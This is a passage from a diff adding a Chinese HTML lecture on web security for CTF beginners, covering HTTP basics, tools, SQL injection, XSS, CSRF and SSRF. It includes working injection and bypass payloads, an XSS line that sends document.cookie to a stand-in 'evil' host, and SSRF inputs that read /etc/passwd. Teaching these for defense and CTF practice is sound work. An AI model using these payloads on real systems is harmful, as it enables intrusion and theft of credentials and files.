@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web 安全方向系统讲义 —— 从零基础到 CTF Web 入门</title>
+<style>
+  :root{
+    --bg:#f7f6f3; --card:#ffffff; --ink:#262624; --muted:#6b6a65;
+    --line:#e5e3dd; --brand:#2563eb; --brand-soft:#eff4ff;
+    --accent:#0f766e; --accent-soft:#e7f5f2;
+    --warn:#b45309; --warn-soft:#fef4e6;
+    --danger:#b91c1c; --danger-soft:#fdeeee;
+    --purple:#7c3aed; --purple-soft:#f3efff;
+    --code-bg:#1e2230; --code-ink:#e6e8f0;
+    --mono:ui-monospace,SFMono-Regular,Consolas,"Courier New",monospace;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;background:var(--bg);color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei","PingFang SC",sans-serif;
+    line-height:1.78;font-size:16px}
+  .wrap{max-width:920px;margin:0 auto;padding:0 22px 100px}
+  header.hero{background:linear-gradient(135deg,#1e3a8a,#2563eb 52%,#0f766e);color:#fff;
+    padding:58px 22px 48px;margin-bottom:34px}
+  .hero-in{max-width:920px;margin:0 auto}
+  .hero h1{margin:0 0 12px;font-size:33px;line-height:1.3;font-weight:700}
+  .hero p{margin:6px 0;opacity:.94;font-size:16px}
+  .badge{display:inline-block;background:rgba(255,255,255,.18);border:1px solid rgba(255,255,255,.3);
+    padding:4px 12px;border-radius:999px;font-size:13px;margin:10px 8px 0 0}
+  .toc{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:24px 28px;margin-bottom:24px}
+  .toc h2{margin:0 0 14px;font-size:20px}
+  .toc .part{margin:16px 0 6px;font-weight:700;color:var(--brand);font-size:15px}
+  .toc ol{margin:0;padding-left:22px}
+  .toc li{margin:4px 0}
+  .toc a{color:#334155;text-decoration:none}
+  .toc a:hover{color:var(--brand);text-decoration:underline}
+  .map{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:12px;margin:18px 0}
+  .map .m{border:1px solid var(--line);border-radius:12px;padding:14px 16px;background:#fbfbfa}
+  .map .m b{display:block;font-size:15px;margin-bottom:6px}
+  .map .m span{font-size:13.5px;color:var(--muted)}
+  section{background:var(--card);border:1px solid var(--line);border-radius:14px;
+    padding:28px 30px;margin-bottom:22px}
+  h2.sec{font-size:24px;margin:0 0 6px;padding-bottom:12px;border-bottom:2px solid var(--brand-soft)}
+  h2.sec .num{color:var(--brand);margin-right:10px}
+  h3{font-size:19px;margin:26px 0 8px;color:#1e293b}
+  h4{font-size:16px;margin:18px 0 6px;color:#334155}
+  p{margin:10px 0}
+  ul,ol{margin:10px 0;padding-left:24px}
+  li{margin:6px 0}
+  code{font-family:var(--mono);background:#eef0f4;color:#b91c1c;padding:2px 6px;border-radius:5px;font-size:.9em}
+  pre{background:var(--code-bg);color:var(--code-ink);border-radius:10px;padding:18px 20px;
+    overflow-x:auto;font-family:var(--mono);font-size:13.5px;line-height:1.65;margin:14px 0}
+  pre code{background:none;color:inherit;padding:0;font-size:inherit}
+  .k{color:#c792ea}.s{color:#c3e88d}.c{color:#7f8496;font-style:italic}
+  .v{color:#f78c6c}.f{color:#82aaff}.n{color:#ffcb6b}
+  .box{border-radius:10px;padding:14px 18px;margin:16px 0;border-left:4px solid}
+  .box .bt{font-weight:700;margin-bottom:4px;display:block}
+  .tip{background:var(--accent-soft);border-color:var(--accent)} .tip .bt{color:var(--accent)}
+  .note{background:var(--brand-soft);border-color:var(--brand)} .note .bt{color:var(--brand)}
+  .warn{background:var(--warn-soft);border-color:var(--warn)} .warn .bt{color:var(--warn)}
+  .goal{background:var(--danger-soft);border-color:var(--danger)} .goal .bt{color:var(--danger)}
+  .deep{background:var(--purple-soft);border-color:var(--purple)} .deep .bt{color:var(--purple)}
+  table{border-collapse:collapse;width:100%;margin:16px 0;font-size:14.5px}
+  th,td{border:1px solid var(--line);padding:10px 12px;text-align:left;vertical-align:top}
+  th{background:#f1f5f9;font-weight:600}
+  tr:nth-child(even) td{background:#fafafa}
+  .flow{background:#fbfbfa;border:1px dashed var(--line);border-radius:10px;padding:16px;margin:14px 0;
+    font-family:var(--mono);font-size:13px;white-space:pre;overflow-x:auto;text-align:left;line-height:1.7;color:#334155}
+  .kw{background:#fef3c7;padding:1px 5px;border-radius:4px;color:#92400e}
+  .flagbox{background:#0f172a;color:#a7f3d0;border-radius:10px;padding:16px 20px;font-family:var(--mono);font-size:14px;word-break:break-all;margin:12px 0}
+  .divider{height:1px;background:var(--line);margin:26px 0}
+  .foot{text-align:center;color:var(--muted);font-size:14px;margin-top:40px}
+  a.top{float:right;font-size:13px;color:var(--muted);text-decoration:none}
+  a.top:hover{color:var(--brand)}
+  .lead{font-size:15px;color:#475569}
+  .pill{display:inline-block;background:#eef2ff;color:#4338ca;border-radius:6px;padding:1px 8px;font-size:12.5px;margin-right:6px}
+  @media(max-width:640px){section{padding:20px 18px}.hero h1{font-size:26px}}
+</style>
+</head>
+<body>
+<header class="hero">
+  <div class="hero-in">
+    <h1>Web 安全方向系统讲义</h1>
+    <p>从零基础到 CTF Web 入门 —— 写给网安专业大一学生的完整知识地图</p>
+    <p>
+      <span class="badge">零基础友好</span>
+      <span class="badge">OWASP Top 10 主线</span>
+      <span class="badge">原理 + 利用 + 防御</span>
+      <span class="badge">CTF 解题方法论</span>
+      <span class="badge">含大量代码示例</span>
+    </p>
+  </div>
+</header>
+
+<div class="wrap">
+
+<nav class="toc">
+  <h2>目录（点标题直接跳转）</h2>
+  <div class="part">导读</div>
+  <ol>
+    <li><a href="#intro">这份讲义怎么用 · Web 安全知识地图</a></li>
+  </ol>
+  <div class="part">第一篇 · 基础篇（打好地基）</div>
+  <ol start="1">
+    <li><a href="#c1">第 1 章　Web 是怎么工作的（HTTP / 请求响应 / Cookie）</a></li>
+    <li><a href="#c2">第 2 章　必备工具箱（浏览器 / Burp / curl / Linux）</a></li>
+    <li><a href="#c3">第 3 章　Web 开发基础（HTML / JS / PHP / SQL）</a></li>
+  </ol>
+  <div class="part">第二篇 · 漏洞篇（核心，OWASP 主线）</div>
+  <ol start="4">
+    <li><a href="#c4">第 4 章　SQL 注入</a></li>
+    <li><a href="#c5">第 5 章　XSS 跨站脚本</a></li>
+    <li><a href="#c6">第 6 章　CSRF 与 SSRF</a></li>
+    <li><a href="#c7">第 7 章　文件上传与文件包含</a></li>
+    <li><a href="#c8">第 8 章　命令注入与代码执行</a></li>
+    <li><a href="#c9">第 9 章　反序列化漏洞</a></li>
+    <li><a href="#c10">第 10 章　XXE 与模板注入（SSTI）</a></li>
+    <li><a href="#c11">第 11 章　逻辑漏洞与认证缺陷</a></li>
+    <li><a href="#c12">第 12 章　其他漏洞（目录穿越 / 文件读取 / 条件竞争 / 信息泄露）</a></li>
+  </ol>
+  <div class="part">第三篇 · 实战篇（CTF Web 方法论）</div>
+  <ol start="13">
+    <li><a href="#c13">第 13 章　CTF Web 通用解题流程</a></li>
+    <li><a href="#c14">第 14 章　PHP 特性与绕过技巧合集</a></li>
+    <li><a href="#c15">第 15 章　WAF 绕过与过滤规避思路</a></li>
+    <li><a href="#c16">第 16 章　Web 解题的六种思维引擎</a></li>
+    <li><a href="#c17">第 17 章　Web 实战逐帧演示（含走弯路）</a></li>
+  </ol>
+  <div class="part">第四篇 · 成长篇</div>
+  <ol start="18">
+    <li><a href="#c18">第 18 章　防御体系与 OWASP Top 10</a></li>
+    <li><a href="#c19">第 19 章　学习路线、资源与法律底线</a></li>
+  </ol>
+  <div class="part">附录</div>
+  <ol>
+    <li><a href="#c20">术语表 · payload / 命令速查 · 推荐靶场</a></li>
+  </ol>
+</nav>
+
+<section id="intro">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec">导读：这份讲义怎么用</h2>
+  <p class="lead">这不是一本让你背的书，而是一张地图。每一章都按"<strong>是什么 → 为什么 → 怎么利用 → 怎么防御</strong>"四步讲。你不需要一次读完，建议按顺序推进，每学一章就去靶场做一道对应类型的题。</p>
+
+  <h3>三条贯穿全书的主线</h3>
+  <ol>
+    <li><strong>数据流思维</strong>：任何漏洞，本质都是"用户输入的数据，流到了一个不该去的地方，或被以不该有的方式解释"。学会追踪数据在程序里怎么流动、被谁解释，你就抓住了安全的核心。</li>
+    <li><strong>上下文思维</strong>：同一段字符，在 HTML 里、SQL 里、命令行里、文件路径里含义完全不同。漏洞常常发生在"数据从一个上下文进入另一个上下文时没被正确处理"。</li>
+    <li><strong>信任边界思维</strong>：程序里每一处"相信了不可信输入"的地方，都是潜在漏洞。永远不要相信来自浏览器的数据。</li>
+  </ol>
+
+  <h3>Web 安全知识地图</h3>
+  <div class="map">
+    <div class="m"><b>① 基础层</b><span>HTTP 协议 · Web 工作原理 · 开发工具 · HTML/JS/PHP/SQL 语法</span></div>
+    <div class="m"><b>② 注入类</b><span>SQL 注入 · 命令注入 · 代码执行 · XXE · SSTI</span></div>
+    <div class="m"><b>③ 前端类</b><span>XSS · CSRF · 点击劫持 · DOM 型漏洞</span></div>
+    <div class="m"><b>④ 服务端类</b><span>文件包含 · 文件上传 · SSRF · 反序列化 · 逻辑漏洞</span></div>
+    <div class="m"><b>⑤ 方法论</b><span>信息收集 · 代码审计 · payload 构造 · 过滤绕过</span></div>
+    <div class="m"><b>⑥ 防御视角</b><span>参数化查询 · 输出编码 · 最小权限 · 安全配置</span></div>
+  </div>
+  <div class="tip"><span class="bt">给你的一句话定位</span>
+  你现在是第 ① 层往第 ② ③ 层过渡的阶段。先把基础打牢，再一类一类啃漏洞。<strong>每一类漏洞都要做到"能讲清原理、能手工利用、能写出防御"这三个层次。</strong></div>
+</section>
+
+<section id="c1">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 1 章</span>Web 是怎么工作的</h2>
+  <p class="lead">想攻击 Web，先得懂 Web 正常是怎么运转的。这一章把"从输入网址到看到页面"的全过程拆开。</p>
+
+  <h3>1.1 从输入网址到看到页面</h3>
+  <div class="flow">1. 你在浏览器输入 https://example.com/index.php
+2. DNS 解析：把域名 example.com 翻译成服务器的 IP 地址
+3. 建立连接：客户端与服务器完成 TCP 三次握手（HTTPS 还要 TLS 握手）
+4. 发送请求：浏览器发出一个 HTTP 请求报文
+5. 服务器处理：Web 服务器（如 Nginx）+ 应用（如 PHP）执行程序、查数据库
+6. 返回响应：服务器发回 HTTP 响应报文，里面是 HTML
+7. 浏览器渲染：解析 HTML/CSS/JS，画出你看到的页面</div>
+  <p>安全漏洞可以出现在链条的<strong>任何一环</strong>：DNS 劫持、中间人攻击（第 2-4 步）、服务端漏洞（第 5 步）、XSS（第 7 步）。Web 方向主要聚焦第 5、7 步。</p>
+
+  <h3>1.2 HTTP 请求报文长什么样</h3>
+  <p>你在浏览器按 F12 → Network，点任意一个请求，就能看到真实报文。一个 GET 请求：</p>
+  <pre><code><span class="f">GET</span> /index.php?id=1 <span class="f">HTTP/1.1</span>          <span class="c">← 请求行：方法 路径 协议版本</span>
+<span class="v">Host:</span> example.com                       <span class="c">← 请求头（Header）</span>
+<span class="v">User-Agent:</span> Mozilla/5.0 ...
+<span class="v">Cookie:</span> PHPSESSID=abc123               <span class="c">← 携带的身份凭证</span>
+<span class="v">Accept:</span> text/html,...
+                                        <span class="c">← 空行之后是请求体（GET 一般为空）</span></code></pre>
+  <p>一个 POST 请求会把数据放在请求体里：</p>
+  <pre><code><span class="f">POST</span> /login.php <span class="f">HTTP/1.1</span>
+<span class="v">Host:</span> example.com
+<span class="v">Content-Type:</span> application/x-www-form-urlencoded
+<span class="v">Content-Length:</span> 29
+
+username=admin&amp;password=123456      <span class="c">← 请求体（表单数据）</span></code></pre>
+
+  <h3>1.3 HTTP 响应报文</h3>
+  <pre><code><span class="f">HTTP/1.1</span> 200 OK                          <span class="c">← 状态码</span>
+<span class="v">Content-Type:</span> text/html; charset=utf-8
+<span class="v">Set-Cookie:</span> session=xyz; HttpOnly        <span class="c">← 服务器给浏览器种 Cookie</span>
+<span class="v">Server:</span> nginx
+
+&lt;html&gt;...&lt;/html&gt;                        <span class="c">← 响应体（网页内容）</span></code></pre>
+
+  <h3>1.4 必须记住的状态码</h3>
+  <table>
+    <tr><th>类别</th><th>常见码</th><th>含义</th></tr>
+    <tr><td>2xx 成功</td><td>200</td><td>请求成功</td></tr>
+    <tr><td>3xx 重定向</td><td>301 / 302</td><td>永久 / 临时跳转。CTF 中常藏线索在跳转前的响应里</td></tr>
+    <tr><td rowspan="2">4xx 客户端错误</td><td>403</td><td>禁止访问（有文件但没权限）</td></tr>
+    <tr><td>404</td><td>找不到（文件不存在）</td></tr>
+    <tr><td>5xx 服务端错误</td><td>500</td><td>服务器内部出错——注入点常常靠它暴露</td></tr>
+  </table>
+
+  <h3>1.5 请求方法</h3>
+  <p><code>GET</code>（取数据，参数在 URL）、<code>POST</code>（提交数据，参数在请求体）最常用。还有 <code>PUT</code>、<code>DELETE</code>、<code>HEAD</code>、<code>OPTIONS</code> 等。CTF 有时会考"换方法绕过限制"。PHP 里 <code>$_REQUEST</code> 能同时接收 GET 和 POST 参数，这就是上一份笔记那道题能用 <code>?file=</code> 的原因。</p>
+
+  <h3>1.6 Cookie 与 Session：HTTP 怎么"记住你"</h3>
+  <p>HTTP 本身是<strong>无状态</strong>的——服务器默认不记得你是谁。于是有了：</p>
+  <ul>
+    <li><strong>Cookie</strong>：服务器通过 <code>Set-Cookie</code> 给浏览器一小段数据，浏览器之后每次请求都自动带上。</li>
+    <li><strong>Session</strong>：服务器为每个用户保存一份状态，只把"会话 ID"（session id）通过 Cookie 发给浏览器。</li>
+  </ul>
+  <div class="note"><span class="bt">安全关联</span>
+  登录凭证存在 Cookie/Session 里，所以：XSS 偷 Cookie、CSRF 冒用 Cookie、Session 固定/劫持，都是围绕它展开的攻击。响应头里的 <code>HttpOnly</code> 能阻止 JS 读取 Cookie，是防 XSS 窃取的重要措施。</div>
+
+  <h3>1.7 HTTPS 简述</h3>
+  <p>HTTPS = HTTP + TLS 加密。它解决的是"传输过程被窃听/篡改"的问题，<strong>但并不能修复应用本身的漏洞</strong>——一个用了 HTTPS 的网站照样可能有 SQL 注入、XSS。别把"小锁图标"当成安全保证。</p>
+</section>
+
+<section id="c2">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 2 章</span>必备工具箱</h2>
+  <p class="lead">工欲善其事，必先利其器。这几个工具你现在就该装好、会用。</p>
+
+  <h3>2.1 浏览器开发者工具（F12）</h3>
+  <ul>
+    <li><strong>Elements</strong>：看/改网页 HTML 和 CSS，找隐藏元素和注释。</li>
+    <li><strong>Network（网络）</strong>：看所有请求响应报文、状态码、参数——Web 安全最高频的面板。</li>
+    <li><strong>Console（控制台）</strong>：执行 JS，测试 XSS payload 就在这里。</li>
+    <li><strong>Application</strong>：看 Cookie、LocalStorage。</li>
+  </ul>
+
+  <h3>2.2 Burp Suite（Web 安全第一神器）</h3>
+  <p>一个"中间人代理"：浏览器所有流量先经过它，你能<strong>拦截、查看、任意修改</strong>每一个请求再放行。核心模块：</p>
+  <table>
+    <tr><th>模块</th><th>作用</th></tr>
+    <tr><td>Proxy</td><td>抓包、改包。拦截开关 Intercept is on/off</td></tr>
+    <tr><td>Repeater</td><td>手动重放单个请求，反复改参数测试——最常用</td></tr>
+    <tr><td>Intruder</td><td>自动化批量发请求（爆破、fuzz）</td></tr>
+    <tr><td>Decoder</td><td>编码/解码（URL、Base64、Hex）</td></tr>
+  </table>
+  <div class="tip"><span class="bt">上手建议</span>
+  装好 Burp + 浏览器代理插件（如 FoxyProxy），把流量代理到 <code>127.0.0.1:8080</code>，装好 CA 证书解决 HTTPS 提示。先练熟 Proxy 抓包和 Repeater 改参数，这两个够你应付大半 CTF Web 题。</div>
+
+  <h3>2.3 curl（命令行发请求）</h3>
+  <p>不用开浏览器就能发请求，写脚本、批量测试很方便。常用：</p>
+  <pre><code><span class="f">curl</span> -i URL                      <span class="c"># 显示响应头+响应体</span>
+<span class="f">curl</span> -X POST -d <span class="s">"a=1&amp;b=2"</span> URL        <span class="c"># 发 POST 请求</span>
+<span class="f">curl</span> -b <span class="s">"cookie=xxx"</span> URL           <span class="c"># 带 Cookie</span>
+<span class="f">curl</span> --path-as-is URL              <span class="c"># 不自动规范化 ../ 路径（测目录穿越用）</span></code></pre>
+
+  <h3>2.4 Linux 虚拟机</h3>
+  <p>用 VirtualBox/VMware 装一个 Kali Linux 或 Ubuntu。很多工具（sqlmap、nmap、dirsearch）在 Linux 下最好用，靶场也常是 Linux 环境，熟悉基本命令（<code>cd ls cat pwd grep find chmod</code>）是必备。</p>
+
+  <h3>2.5 其他会陆续用到的</h3>
+  <p><code>sqlmap</code>（自动化 SQL 注入）、<code>dirsearch</code>（目录扫描）、<code>nmap</code>（端口扫描）、Wappalyzer（识别网站技术栈）、在线编码解码工具。这些东西先知道名字，用到时再学。</p>
+</section>
+
+<section id="c3">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 3 章</span>Web 开发基础</h2>
+  <p class="lead">你不用成为开发高手，但要能读懂代码、知道正常写法长什么样，才认得出"不正常的写法"就是漏洞。</p>
+
+  <h3>3.1 HTML 与 JavaScript  essentials</h3>
+  <ul>
+    <li>HTML 用标签描述页面结构：<code>&lt;div&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>。</li>
+    <li>JS 让页面能动：<code>document.getElementById()</code>、<code>innerHTML</code>、<code>eval()</code>、事件 <code>onerror/onclick</code>。</li>
+    <li>注意：把用户输入拼进 <code>innerHTML</code> 或 <code>eval</code>，就是 XSS 的温床。</li>
+  </ul>
+
+  <h3>3.2 PHP 核心（CTF Web 半壁江山）</h3>
+  <p>PHP 是最常见的 CTF Web 后端语言，重点掌握：</p>
+  <pre><code><span class="k">&lt;?php</span>
+<span class="v">$name</span> = <span class="v">$_GET</span>[<span class="s">'n'</span>] ?? <span class="s">'guest'</span>;   <span class="c">// 超全局变量接收 URL 参数</span>
+<span class="v">$arr</span>  = [<span class="s">'a'</span>=&gt;1, <span class="s">'b'</span>=&gt;2];            <span class="c">// 数组</span>
+<span class="k">if</span> (<span class="v">$name</span> === <span class="s">'admin'</span>) { <span class="k">echo</span> <span class="s">"hi"</span>; }      <span class="c">// 条件判断</span>
+<span class="f">include</span> <span class="s">"header.php"</span>;                        <span class="c">// 文件包含</span>
+<span class="k">echo</span> <span class="f">file_get_contents</span>(<span class="s">"/etc/passwd"</span>);           <span class="c">// 读文件</span>
+<span class="k">?&gt;</span></code></pre>
+  <p>超全局变量：<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>（两者皆含）、<code>$_COOKIE</code>、<code>$_SERVER</code>、<code>$_FILES</code>。<strong>它们全部来自用户，全部不可信。</strong></p>
+
+  <h3>3.3 SQL 基础</h3>
+  <p>数据库用来存数据，Web 程序靠 SQL 语句增删改查。最核心的查询：</p>
+  <pre><code><span class="f">SELECT</span> username, password <span class="f">FROM</span> users <span class="f">WHERE</span> id = 1;
+<span class="f">SELECT</span> * <span class="f">FROM</span> users <span class="f">UNION SELECT</span> 1,2,3;   <span class="c">-- 联合查询（注入常用）</span></code></pre>
+  <p>记住 <code>SELECT ... FROM ... WHERE ...</code>、<code>UNION</code>、<code>ORDER BY</code>、注释符 <code>-- </code> 和 <code>#</code>。后面 SQL 注入全靠这些。</p>
+
+  <h3>3.4 数据是怎么在前后端流动的</h3>
+  <div class="flow">用户在表单输入 → 浏览器发 HTTP 请求（参数）→ 后端 PHP 用 $_GET/$_POST 取出
+      → 拼进 SQL 语句查数据库 / 拼进 HTML 返回 / 拼进文件路径 / 拼进系统命令
+      → 结果返回浏览器显示</div>
+  <div class="deep"><span class="bt">全书的"万能公式"</span>
+  上面这条链里，<strong>"拼进"的四个去向，正好对应四大类漏洞</strong>：拼进 SQL → SQL 注入；拼进 HTML → XSS；拼进文件路径 → 文件包含/读取；拼进系统命令 → 命令注入。你现在就把这个对应关系刻进脑子，后面每一章都是在展开它。</div>
+</section>
+
+<section id="c4">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 4 章</span>SQL 注入（SQLi）</h2>
+  <p class="lead">最经典、危害最大、CTF 出现率最高的漏洞之一。本质：<strong>用户输入被拼进 SQL 语句，改变了语句原本的逻辑。</strong></p>
+
+  <h3>4.1 漏洞是怎么产生的</h3>
+  <p>看一段有问题的后端代码：</p>
+  <pre><code><span class="c">// 后端 PHP</span>
+<span class="v">$id</span> = <span class="v">$_GET</span>[<span class="s">'id'</span>];
+<span class="v">$sql</span> = <span class="s">"SELECT * FROM users WHERE id = "</span> . <span class="v">$id</span>;   <span class="c">// 直接拼接！</span>
+<span class="v">$result</span> = <span class="f">mysqli_query</span>(<span class="v">$conn</span>, <span class="v">$sql</span>);</code></pre>
+  <p>正常访问 <code>?id=1</code>，SQL 是 <code>... WHERE id = 1</code>。但攻击者传 <code>?id=1 OR 1=1</code>，SQL 变成：</p>
+  <pre><code><span class="f">SELECT</span> * <span class="f">FROM</span> users <span class="f">WHERE</span> id = 1 <span class="f">OR</span> 1=1;   <span class="c">-- 恒真，返回所有用户！</span></code></pre>
+  <p>用户的输入"逃逸"出了原本的数据位置，变成了 SQL 代码的一部分。这就是注入。</p>
+
+  <h3>4.2 怎么判断一个地方有没有注入</h3>
+  <ol>
+    <li>找带参数的地方：<code>?id=</code>、<code>?username=</code>、搜索框、登录框等。</li>
+    <li>加单引号 <code>'</code>：如果页面报错或异常（SQL 语法错误），大概率有注入。</li>
+    <li>经典测试：<code>?id=1' and 1=1--+</code> 页面正常；<code>?id=1' and 1=2--+</code> 页面异常 → 确认注入存在。</li>
+  </ol>
+  <div class="note"><span class="bt">--+ 是什么</span>
+  <code>--+</code> 是 SQL 注释符 <code>--</code> 加一个 <code>+</code>（<code>+</code> 在 URL 里会被解码成空格，让注释生效），作用是把原 SQL 后面剩下的内容注释掉。MySQL 里也可用 <code>#</code>。</div>
+
+  <h3>4.3 注入的三大目标与手法</h3>
+  <h4>① 联合查询注入（union）—— 最直接</h4>
+  <p>先猜列数（<code>ORDER BY 1,2,3...</code> 直到报错），再用 union 拼出想要的数据：</p>
+  <pre><code>?id=1' <span class="f">ORDER BY</span> 3--+                        <span class="c"># 探测列数</span>
+?id=-1' <span class="f">UNION SELECT</span> 1,2,3--+               <span class="c"># 让前面查不到，显示 union 的结果</span>
+?id=-1' <span class="f">UNION SELECT</span> 1,database(),version()--+  <span class="c"># 爆库名、版本</span>
+?id=-1' <span class="f">UNION SELECT</span> 1,group_concat(table_name),3 <span class="f">FROM</span> information_schema.tables <span class="f">WHERE</span> table_schema=database()--+  <span class="c"># 爆表名</span></code></pre>
+  <p><code>information_schema</code> 是 MySQL 自带的信息库，存着所有库名、表名、列名——注入的"地图"。</p>
+
+  <h4>② 盲注 —— 页面不回显数据时</h4>
+  <p>如果页面不显示查询结果，只能靠"真/假"或"时间差"一点一点猜：</p>
+  <ul>
+    <li><strong>布尔盲注</strong>：<code>?id=1' and ascii(substr(database(),1,1))&gt;100--+</code>，看页面真假判断字符。</li>
+    <li><strong>时间盲注</strong>：<code>?id=1' and if(ascii(substr(database(),1,1))&gt;100,sleep(5),0)--+</code>，靠响应是否延迟判断。</li>
+  </ul>
+
+  <h4>③ 报错注入 —— 让错误信息带出数据</h4>
+  <pre><code>?id=1' <span class="f">and updatexml</span>(1,concat(0x7e,database()),1)--+</code></pre>
+  <p>故意制造报错，把想查的数据塞进错误信息里显示出来。</p>
+
+  <h3>4.4 常见绕过（当关键词被过滤）</h3>
+  <ul>
+    <li>注释/大小写混淆：<code>un/**/ion</code>、<code>UnIoN</code></li>
+    <li>编码：<code>%75nion</code>（URL 编码）、十六进制</li>
+    <li>等价替换：<code>and</code> → <code>&amp;&amp;</code>，<code>or</code> → <code>||</code>，空格 → <code>%20</code>/<code>/**/</code></li>
+    <li>双写绕过：<code>selselectect</code>（过滤掉一个 select 后剩下 select）</li>
+  </ul>
+
+  <h3>4.5 防御（必须能说出来）</h3>
+  <div class="tip"><span class="bt">根治方法：参数化查询 / 预编译</span>
+  把 SQL 语句和数据分开传，数据永远只当数据，不参与语句拼装：
+  <pre><code><span class="v">$stmt</span> = <span class="v">$conn</span>-&gt;<span class="f">prepare</span>(<span class="s">"SELECT * FROM users WHERE id = ?"</span>);
+<span class="v">$stmt</span>-&gt;<span class="f">bind_param</span>(<span class="s">"i"</span>, <span class="v">$_GET</span>[<span class="s">'id'</span>]);</code></pre>
+  辅助手段：输入类型校验、最小数据库权限、关闭详细报错回显、WAF。</div>
+</section>
+
+<section id="c5">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 5 章</span>XSS 跨站脚本（Cross-Site Scripting）</h2>
+  <p class="lead">本质：<strong>用户输入被当成 HTML/JS 代码，在别人的浏览器里执行了。</strong>注意它攻击的是"其他访问者"，不是服务器。</p>
+
+  <h3>5.1 一个最小例子</h3>
+  <p>假如网站把搜索关键词直接显示出来：</p>
+  <pre><code><span class="c">// PHP：把用户输入原样输出到页面</span>
+<span class="k">echo</span> <span class="s">"搜索结果："</span> . <span class="v">$_GET</span>[<span class="s">'q'</span>];</code></pre>
+  <p>攻击者构造链接 <code>?q=&lt;script&gt;alert(1)&lt;/script&gt;</code>，诱使别人点击，对方的浏览器就会弹出 alert——证明 JS 被执行了。真实攻击里 alert 会换成窃取 Cookie 的脚本。</p>
+
+  <h3>5.2 三种类型（必考）</h3>
+  <table>
+    <tr><th>类型</th><th>特点</th><th>场景</th></tr>
+    <tr><td><strong>反射型</strong></td><td>payload 在 URL 里，服务器"反射"回来，一次性</td><td>诱导点击恶意链接</td></tr>
+    <tr><td><strong>存储型</strong></td><td>payload 存进数据库，每次访问都触发，危害最大</td><td>评论区、留言板、昵称</td></tr>
+    <tr><td><strong>DOM 型</strong></td><td>纯前端 JS 处理 URL 时不安全，不经过服务器</td><td>前端用了 innerHTML/document.write</td></tr>
+  </table>
+
+  <h3>5.3 常用 payload（理解原理，不要死记）</h3>
+  <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;              <span class="c"># 图不存在触发 onerror</span>
+&lt;svg/onload=alert(1)&gt;
+&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;
+'&gt;&lt;img src=x onerror=alert(1)&gt;            <span class="c"># 需要闭合属性/标签时</span>
+&lt;img src=x onerror="fetch('//evil/'+document.cookie)"&gt;  <span class="c"># 偷 Cookie</span></code></pre>
+
+  <h3>5.4 绕过过滤的思路</h3>
+  <ul>
+    <li>关键字被过滤：大小写混写、双写、编码（HTML 实体、JS 编码）。</li>
+    <li>事件绕过：不用 <code>&lt;script&gt;</code>，改用 <code>onerror</code>、<code>onload</code> 等事件属性。</li>
+    <li>闭合绕过：先试探输入点被放在标签的哪个位置（属性内？标签间？注释里？），再决定怎么闭合逃逸。</li>
+  </ul>
+
+  <h3>5.5 防御</h3>
+  <div class="tip"><span class="bt">核心：输出编码 + 上下文感知</span>
+  <ul>
+    <li>把用户输入输出到 HTML 时做转义：<code>htmlspecialchars()</code>（把 <code>&lt;</code> 变 <code>&amp;lt;</code>），让它只当文本显示。</li>
+    <li>输出到 JS / URL / 属性要用对应规则的编码，不能一律 htmlspecialchars。</li>
+    <li>Cookie 加 <code>HttpOnly</code>，让 JS 读不到，即使有 XSS 也偷不到会话。</li>
+    <li>部署 CSP（内容安全策略），限制能执行的脚本来源。</li>
+  </ul></div>
+</section>
+
+<section id="c6">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 6 章</span>CSRF 与 SSRF</h2>
+  <p class="lead">这两个名字很像，方向却相反：<strong>CSRF 借用户的浏览器发请求，SSRF 借服务器发请求。</strong></p>
+
+  <h3>6.1 CSRF（跨站请求伪造）</h3>
+  <p><strong>原理</strong>：浏览器发请求时会自动带上 Cookie。如果我诱导已登录的用户访问一个恶意页面，这个页面能悄悄以他的身份向目标网站发请求（比如转账、改密码），而网站分不清是不是本人操作。</p>
+  <div class="flow">用户已登录 bank.com（浏览器存着 Cookie）
+      ↓ 访问了 evil.com 的恶意页面
+evil.com 页面自动提交一个表单 → POST bank.com/transfer?to=黑客&amp;money=10000
+      ↓ 浏览器自动带上 bank.com 的 Cookie
+bank.com 以为是本人操作 → 转账成功 😱</div>
+  <p><strong>防御</strong>：</p>
+  <ul>
+    <li>关键操作加 <strong>CSRF Token</strong>：服务器生成随机令牌放表单里，提交时校验，恶意站点拿不到。</li>
+    <li>Cookie 设 <code>SameSite=Lax/Strict</code>，阻止跨站请求携带 Cookie。</li>
+    <li>重要操作二次验证（密码、验证码）。</li>
+    <li>检查 Referer/Origin 来源。</li>
+  </ul>
+
+  <h3>6.2 SSRF（服务端请求伪造）</h3>
+  <p><strong>原理</strong>：服务器提供"根据 URL 拉取内容"的功能（如图片抓取、网址预览），但没限制目标。攻击者把 URL 指向服务器<strong>内网或本机</strong>，让服务器去请求，从而探测内网、读取本地文件、攻击内网服务。</p>
+  <pre><code><span class="c"># 正常功能：?url=https://example.com/pic.jpg 服务器去取图</span>
+<span class="c"># 攻击：让服务器请求自己的内网管理接口或本地文件</span>
+?url=file:///etc/passwd                       <span class="c"># 读本地文件</span>
+?url=http://127.0.0.1:6379/                   <span class="c"># 探测本机 Redis</span>
+?url=http://192.168.1.1/admin                 <span class="c"># 访问内网路由器管理页</span>
+?url=gopher://127.0.0.1:6379/_...             <span class="c"># gopher 协议打内网服务（进阶）</span></code></pre>
